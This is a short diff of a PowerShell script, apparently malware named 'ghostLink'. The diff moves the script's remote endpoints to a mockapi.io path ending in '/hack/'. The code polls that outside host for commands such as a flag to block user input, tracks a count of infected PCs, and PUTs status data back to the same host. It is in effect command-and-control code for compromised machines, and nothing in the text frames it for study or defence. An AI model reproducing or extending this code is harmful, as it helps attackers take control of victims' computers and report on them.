@@ -52,7 +52,7 @@ $global:lastNbPcInfectIncr = ""
 
 function checkDataBase {
     try {
-        $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/" -Method Get -TimeoutSec 5
+        $response = Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack/" -Method Get -TimeoutSec 5
         if ($response -ne $null) {
             $global:blockUserInput = $response.blockUserInput
             $global:nbPcInfect = $response.nbPcInfect.nbPcInfect
@@ -107,7 +107,7 @@ function main {
             } | ConvertTo-Json
             $headers = @{ "Content-Type" = "application/json" }
             try {
-                Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/1" `
+                Invoke-RestMethod -Uri "https://68b82111b71540504327314e.mockapi.io/ghostLink/hack/1" `
                                   -Method Put `
                                   -Body $body `
                                   -Headers $headers
